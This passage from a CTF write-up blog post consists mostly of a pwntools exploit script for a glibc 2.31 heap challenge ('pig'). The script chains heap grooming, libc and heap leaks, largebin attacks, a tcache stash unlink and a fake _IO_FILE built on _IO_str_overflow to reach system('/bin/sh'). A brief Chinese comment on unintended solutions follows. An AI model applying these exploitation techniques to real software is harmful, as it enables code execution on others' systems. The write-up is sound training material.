</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;size: &#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;message: &#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>view_message</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>,<span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit_message</span>(idx,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>,<span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;message: &#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete_message</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>,<span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>change_rol</span>(role):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;5&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;A</span><span style=color:#4070a0;font-weight:700>\x01\x95\xc9\x1c</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>2</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;B</span><span style=color:#4070a0;font-weight:700>\x01\x87\xc3\x19</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>3</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;C</span><span style=color:#4070a0;font-weight:700>\x01\xf7\x3c\x32</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./pig&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.31.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>5</span>):
</span></span><span style=display:flex><span>    add_message(<span style=color:#40a070>0x90</span>,<span style=color:#4070a0>&#39;tcache size</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x90</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>))
</span></span><span style=display:flex><span>    delete_message(i)
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
</span></span><span style=display:flex><span>    add_message(<span style=color:#40a070>0x150</span>,<span style=color:#4070a0>&#39;tcache size</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>))
</span></span><span style=display:flex><span>    delete_message(i)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x150</span>,<span style=color:#4070a0>&#39;to unsorted</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 7*</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x150</span>,<span style=color:#4070a0>&#39;to unsorted</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 8</span>
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>7</span>)
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0xB0</span>,<span style=color:#4070a0>&#39;split7</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0xB0</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 5</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x150</span>,<span style=color:#4070a0>&#39;to unsorted</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 9*</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x150</span>,<span style=color:#4070a0>&#39;to unsorted</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 10</span>
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>9</span>)
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0xB0</span>,<span style=color:#4070a0>&#39;split9</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0xB0</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 6</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># prepare done</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x410</span>,<span style=color:#4070a0>&#39;leak_libc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x410</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 11</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x410</span>,<span style=color:#4070a0>&#39;largebin</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x410</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 12</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x410</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x410</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 13</span>
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>12</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>view_message(<span style=color:#40a070>12</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;is: &#34;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span>view_message(<span style=color:#40a070>5</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;is: &#34;</span>)
</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x12750</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_base))
</span></span><span style=display:flex><span>__free_hook_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>_IO_list_all_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;_IO_list_all&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#_IO_str_jump_addr = libc_base + libc.sym[&#34;_IO_str_jump&#34;]</span>
</span></span><span style=display:flex><span>_IO_str_jump_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x1ED560</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>############################### leak done ###############################</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x410</span>,<span style=color:#4070a0>&#39;get back</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x410</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 14</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x420</span>,<span style=color:#4070a0>&#39;largebin</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x420</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 7</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x430</span>,<span style=color:#4070a0>&#39;largebin</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 8</span>
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>7</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x430</span>,<span style=color:#4070a0>&#39;push</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 9</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>edit_message(<span style=color:#40a070>7</span>,(p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(__free_hook_addr <span style=color:#666>-</span> <span style=color:#40a070>0x28</span>)) <span style=color:#666>*</span> (<span style=color:#40a070>0x420</span><span style=color:#666>//</span><span style=color:#40a070>48</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>14</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x430</span>,<span style=color:#4070a0>&#39;push</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 15</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># largebin attack done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x410</span>,<span style=color:#4070a0>&#39;get_back</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>edit_message(<span style=color:#40a070>9</span>,(p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x12C20</span>) <span style=color:#666>+</span> \
</span></span><span style=display:flex><span>                p64(__free_hook_addr <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>)) <span style=color:#666>*</span> (<span style=color:#40a070>0x150</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>))
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>3</span>) 
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x90</span>,<span style=color:#4070a0>&#39;do stash</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x90</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 1</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># stash unlink done</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>edit_message(<span style=color:#40a070>7</span>,(p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(_IO_list_all_addr <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>)) <span style=color:#666>*</span> (<span style=color:#40a070>0x420</span><span style=color:#666>//</span><span style=color:#40a070>48</span>))
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>delete_message(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x430</span>,<span style=color:#4070a0>&#39;push</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># second largebin atk</span>
</span></span><span style=display:flex><span>change_rol(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x330</span>,<span style=color:#4070a0>&#39;pass</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 3</span>
</span></span><span style=display:flex><span>add_message(<span style=color:#40a070>0x430</span>,<span style=color:#4070a0>&#39;pass</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x430</span> <span style=color:#666>//</span> <span style=color:#40a070>48</span>)) <span style=color:#60a0b0;font-style:italic># 4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># _IO_write_base</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(<span style=color:#40a070>0xFFFFFFFFFFFFFFFF</span>) <span style=color:#60a0b0;font-style:italic># _IO_write_ptr</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># _IO_write_end</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x13E20</span>) <span style=color:#60a0b0;font-style:italic># old_buf, _IO_buf_base</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x13E20</span> <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>) <span style=color:#60a0b0;font-style:italic># calc the memcpy length, _IO_buf_end</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>=</span> fake_IO_FILE<span style=color:#666>.</span>ljust(<span style=color:#40a070>0xC0</span> <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># mode &lt;= 0</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#60a0b0;font-style:italic># bypass _unused2</span>
</span></span><span style=display:flex><span>fake_IO_FILE <span style=color:#666>+=</span> p64(_IO_str_jump_addr)
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> fake_IO_FILE <span style=color:#666>+</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> p64(system_addr)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;01dwang&#39;s Gift:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#add_message(0x410,&#39;large_bin\n&#39; * (0x410 // 48)) # 1</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;5&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=关于非预期>关于非预期</h3><p>这道题大概是想减少非预期解，把输入方式变成了都只能分段输入，但是这样会导致最后的 fake_IO_FILE 结构难以布置，所以最后又给了一个连续输入的机会，就导致还是有很多非预期。总体来说对 _IO_str_overflow 的利用很新颖也很有意思，但是堆布局上着实是有些麻烦。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 © chuj | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>